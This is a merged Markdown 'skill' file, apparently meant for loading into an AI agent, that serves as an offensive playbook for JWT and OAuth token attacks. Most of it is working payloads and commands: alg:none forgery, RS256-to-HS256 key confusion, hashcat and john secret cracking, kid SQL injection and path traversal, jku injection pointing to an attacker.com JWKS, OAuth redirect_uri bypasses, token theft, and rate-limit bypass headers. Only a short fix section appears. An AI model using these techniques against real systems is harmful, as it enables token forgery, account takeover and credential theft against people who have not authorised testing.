---
name: jwt-attacks
description: "JWT and OAuth token attack playbook. Use when validating token trust, signing algorithms, key handling, claim abuse, bearer flows, and OAuth account-binding weaknesses."
domain: blockchain-web3
merged: true
merged_from: [hack-skills:jwt-oauth-token-attacks, hacking-skills:jwt-misconfig, hack-skills:api-auth-and-jwt-abuse]
---

# jwt-attacks

> **Fusionierter Skill** — vereint 3 Quell-Skills zu einem: `hack-skills:jwt-oauth-token-attacks`, `hacking-skills:jwt-misconfig`, `hack-skills:api-auth-and-jwt-abuse`. Alle Techniken aller Quellen sind unten zusammengeführt, nichts ausgelassen.

## Quelle: hack-skills — jwt-oauth-token-attacks (302 Zeilen)

# SKILL: JWT and OAuth 2.0 Token Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication token attacks. Covers JWT cryptographic attacks (alg:none, RS256→HS256, secret crack, kid/jku injection), OAuth flow attacks (CSRF, open redirect, token theft, implicit flow abuse), PKCE bypass, and token leakage via Referer/logs. This is critical for modern web applications.

## 0. RELATED ROUTING

Use this file for token-centric attacks and flow abuse. Also load:

- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) for redirect URI, state, nonce, PKCE, and account-binding validation
- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when browser-readable APIs or token leakage may exist cross-origin
- [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md) when the target uses enterprise SSO outside OAuth/OIDC

---

## 1. JWT ANATOMY

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**Decode in terminal**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
# → {"userId":1234,"role":"user"}
```

**Common claim targets** (modify to escalate):
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

```bash
# Burp JWT Editor / python-jwt attack:
# Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

# Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
# OR:
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
# → automatically generates alg:none variants
```

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
# Step 1: Obtain public key (PEM format)
# From: /api/.well-known/jwks.json → convert to PEM
# From: /certs endpoint
# From: OpenSSL extraction from HTTPS cert

# Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# Step 3: Manually:
# Modify header: {"alg":"HS256","typ":"JWT"}
# Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---

## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

HMAC-based JWTs (HS256/HS384/HS512) with weak secret:

```bash
# hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

# john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. ATTACK 4 — kid (Key ID) INJECTION

The `kid` header parameter specifies which key to use for verification. No sanitization = injection:

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`  
Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.

### kid Path Traversal (file read)
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
Server reads `/dev/null` as key → empty string → sign token with empty HMAC.

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
Server reads hostname as key → forge tokens signed with hostname string.

---

## 6. ATTACK 5 — jku / x5u Header Injection

`jku` points to JSON Web Key Set URL. If not whitelisted:
```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

**Setup**:
```bash
# Generate RSA key pair:
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Create JWKS:
python3 -c "
import json, base64, struct
# ... (use python-jwcrypto or jwt_tool to export JWKS)
"

# Host malicious JWKS at attacker.com/malicious-jwks.json
# Sign JWT with attacker's private key
# Server fetches attacker's JWKS → verifies with attacker's public key → accepts
```

**jwt_tool automation**:
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```

---

## 7. OAUTH 2.0 — STATE PARAMETER MISSING (CSRF)

State parameter prevents CSRF in OAuth. If missing:

```
Attack:
1. Click "Login with Google" → OAuth starts → intercept the redirect URL:
   https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...

2. Get the authorization code (stop before exchanging it)
3. Craft URL: https://target.com/oauth/callback?code=ATTACKER_CODE
4. Victim clicks that URL → their session binds to ATTACKER's OAuth identity
→ ACCOUNT TAKEOVER
```

---

## 8. OAUTH — REDIRECT_URI BYPASS

Authorization codes are sent to `redirect_uri`. If validation is weak:

### Open Redirect in redirect_uri
```
Original: redirect_uri=https://target.com/callback
Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
          redirect_uri=https://attacker.com.target.com/callback
          redirect_uri=https://target.com@attacker.com/callback
```

### Partial Path Match
```
Whitelist: https://target.com/callback
Attack: https://target.com/callback%2f../admin (URL path confusion)
        https://target.com/callbackXSS (prefix match only)
```

### Localhost / Development Redirect
```
redirect_uri=http://localhost/steal
redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
```

---

## 9. OAUTH — IMPLICIT FLOW TOKEN THEFT

Implicit flow: token sent in URL fragment `#access_token=...`

**Fragment leakage scenarios**:
- Redirect to attacker page: fragment accessible via `document.referrer` or via `<script>window.location.href</script>` in target page
- Open redirect: `redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → token in fragment lands at attacker's page

---

## 10. OAUTH — SCOPE ESCALATION

Request broader scope than authorized in authorization code:
```
Authorized scope: read:profile
Attack: During token exchange, add scope=admin or scope=read:admin
→ Does server grant requested scope or issued scope?
```

---

## 11. TOKEN LEAKAGE VECTORS

### Referer Header
Token in URL → page loads external resource → Referer leaks token:
```
https://target.com/dashboard#access_token=TOKEN
→ HTML loads: <img src="https://analytics.third-party.com/track">
→ Referer: https://target.com/dashboard#access_token=TOKEN
→ analytics.third-party.com sees token in Referer logs
```

### Server Logs
Access tokens sent in query parameters are stored in:
```
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB logs (AWS)
CloudFront logs
CDN logs
```

---

## 12. JWT TESTING CHECKLIST

```
□ Decode header + payload (base64 decode each part)
□ Identify algorithm: HS256/RS256/ES256/none
□ Modify payload fields (role, userId, isAdmin) → change signature too
□ Test alg:none → remove signature entirely
□ If RS256: find public key → attempt RS256→HS256 confusion
□ If HS256: brute force with hashcat/rockyou
□ Check kid parameter → try SQL injection + path traversal
□ Check jku/x5u header → redirect to attacker JWKS
□ Test token reuse after logout
□ Test expired token acceptance (exp claim)
□ Check for token in GET params (log leakage) vs header
```

---

## 13. OAUTH TESTING CHECKLIST

```
□ Check for state parameter in authorization request
□ Test redirect_uri manipulation (open redirect, prefix match, path confusion)
□ Can tokens be exchanged more than once?
□ Test scope escalation during token exchange
□ Implicit flow: check for token in Referer/history
□ PKCE: can code_challenge be bypassed or code_verifier be empty?
□ Check for authorization code reuse (code must be single-use)
□ Test account linking abuse: link OAuth to existing account with same email
□ Check OAuth provider confusion: use Apple ID to link where Google expected
```

## Quelle: hacking-skills — jwt-misconfig (136 Zeilen)

# JWT Misconfiguration

## What Is Broken and Why

JWTs that accept `alg: none`, trust the algorithm declared in the token header, or use
guessable HMAC secrets allow attackers to forge arbitrary tokens — including admin-level
claims — without knowing any signing key. Algorithm confusion attacks exploit servers
that accept both RS256 (asymmetric) and HS256 (symmetric): the attacker signs with the
public key (which is public) using HS256 and the server verifies it as a valid HMAC.

## Key Signals

- `Authorization: Bearer <base64url>.<base64url>.<base64url>` in requests
- JWTs stored in cookies (check `httpOnly`, `Secure`, `SameSite` flags)
- JWKS endpoint at `/.well-known/jwks.json` or `/oauth/certs` (exposes public key)
- `alg` field in JWT header — watch for `HS256`, `RS256`, `none`
- `kid` (Key ID) field in JWT header — check for path traversal or SQLi
- Short or dictionary-based HMAC secret (crack with hashcat)

## Methodology

1. Decode the JWT header and payload (`base64url` decode each part).
2. Note the `alg` value; attempt to change it to `none` and remove signature.
3. If `alg` is `RS256`, fetch the public key from JWKS endpoint; re-sign with HS256
   using the public key as the HMAC secret.
4. If `alg` is `HS256`, attempt to crack the secret with `hashcat` or `jwt_tool`.
5. Check `kid` value — test for path traversal (`../../dev/null`), SQLi, or SSRF.
6. Modify `exp` claim to far-future timestamp; attempt to use expired tokens.
7. Escalate claims: change `role`, `admin`, `sub`, `userId` in payload after forging.

## Payloads & Tools

```bash
# jwt_tool — Swiss army knife for JWT attacks
pip install jwt_tool
jwt_tool TOKEN -X a           # alg:none attack
jwt_tool TOKEN -X s           # algorithm confusion (RS256→HS256)
jwt_tool TOKEN -C -d wordlist.txt  # crack HMAC secret

# hashcat JWT cracking
hashcat -a 0 -m 16500 TOKEN wordlist.txt

# Manual alg:none
# 1. Decode header: {"alg":"RS256","typ":"JWT"}
# 2. Change to:     {"alg":"none","typ":"JWT"}
# 3. Re-encode and append empty signature: header.payload.
# (trailing dot is required)

# kid SQLi
{"kid": "' UNION SELECT 'attacker_secret' --", "alg":"HS256"}
# Sign token with 'attacker_secret'

# kid path traversal (sign with empty string)
{"kid": "../../dev/null", "alg":"HS256"}
# /dev/null reads as empty → sign with empty string ""
```

## Bypass Techniques

| Attack | Technique |
|--------|-----------|
| `alg: none` | Change header alg to `none`, drop signature, keep trailing dot |
| Algorithm confusion | Fetch RS256 public key; use it as HS256 HMAC secret |
| Weak secret | Crack short/dictionary HMAC with hashcat `-m 16500` |
| `kid` path traversal | Point kid to `/dev/null` or known empty file; sign with `""` |
| `kid` SQLi | Inject SQL into kid to return attacker-controlled key from DB |
| Missing `exp` | If no expiry check, reuse old tokens indefinitely |
| `jku`/`x5u` injection | Point to attacker-hosted JWKS to supply own public key |
| Embedded JWK | Inject `jwk` into header containing attacker's own public key |

## Exploitation Scenarios

**Algorithm confusion to admin:**
Setup → API uses RS256; JWKS endpoint public at `/.well-known/jwks.json`.
Trigger → Fetch public key → re-sign token with HS256 using public key as secret → set
`"role":"admin"` in payload.
Impact → Full admin access without any private key.

**alg:none on misconfigured library:**
Setup → Old version of JWT library doesn't reject `alg: none`.
Trigger → Set `alg: none`, modify `sub` to another user's ID, remove signature.
Impact → Arbitrary account takeover.

**kid path traversal to RCE:**
Setup → `kid` is used to load key from filesystem without sanitization.
Trigger → `kid: "../../proc/self/fd/0"` with socket input; or `../../tmp/evil`.
Impact → Attacker controls signing key; full token forgery.

## False Positives

- `alg: none` rejected with 401 — library properly validates algorithm.
- RS256 server that only accepts RS256 (not HS256) — algorithm confusion not applicable.
- JWKS endpoint present but server uses pinned key in code — `jku`/`x5u` injection blocked.

## Fix Patterns

```javascript
// Always whitelist algorithm — never derive from token header
jwt.verify(token, secret, { algorithms: ['HS256'] });

// For RS256: pin the public key in code, don't trust jku/jwk headers
jwt.verify(token, publicKeyPem, { algorithms: ['RS256'] });

// Always validate exp
const decoded = jwt.verify(token, secret, {
  algorithms: ['HS256'],
  ignoreExpiration: false  // default false — make it explicit
});
```

## Related Skills

JWT attacks are a class of [[auth-bypass]] specific to token-based systems. `kid` SQLi
chains into [[sql-injection]]; `kid` path traversal chains into [[path-traversal]].
Weak session management after JWT compromise connects to [[cookie-attacks]] and
[[session-fixation]].

## Quelle: hack-skills — api-auth-and-jwt-abuse (76 Zeilen)

# SKILL: API Auth and JWT Abuse — Token Trust, Header Tricks, and Rate Limits

> **AI LOAD INSTRUCTION**: Use this skill when APIs rely on JWT, bearer tokens, API keys, or weak request identity signals. Focus on token trust boundaries, claim misuse, header spoofing, and rate-limit bypass.

## 1. TOKEN TRIAGE

Inspect:

- `alg`, `kid`, `jku`, `x5u`
- role, org, tenant, scope, or privilege claims
- issuer and audience mismatches
- reuse of mobile and web tokens across products

## 2. QUICK ATTACK PICKS

| Pattern | First Test |
|---|---|
| `alg:none` acceptance | unsigned token with trailing dot |
| RS256 confusion | switch to HS256 using public key as secret |
| `kid` lookup trust | path traversal or injection in `kid` |
| remote key fetch trust | attacker-controlled `jku` or `x5u` |
| weak secret | offline crack with targeted wordlists |

## 3. HIDDEN FIELDS AND BATCH ABUSE

### Mass assignment field picks

```text
role
isAdmin
admin
verified
plan
tier
permissions
org
owner
```

### Rate limit and batch abuse picks

```text
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
Forwarded: for=9.9.9.9
```

GraphQL or JSON batch abuse candidates:

- arrays of login mutations
- bulk object fetches with varying IDs
- repeated password reset or verification calls in one request

## 4. RATE LIMIT BYPASS FAMILIES

```text
X-Forwarded-For
X-Real-IP
Forwarded
User-Agent rotation
Path case / slash variants
```

## 5. NEXT ROUTING

- For GraphQL batching and hidden parameters: [graphql and hidden parameters](../graphql-and-hidden-parameters/SKILL.md)
- For default credential and brute-force planning: [authentication bypass](../authbypass-authentication-flaws/SKILL.md)
- For full JWT and OAuth depth: [jwt oauth token attacks](../jwt-oauth-token-attacks/SKILL.md)
- For OAuth or OIDC configuration flaws in browser and SSO flows: [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md)
- For credentialed browser reads and origin trust bugs: [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md)
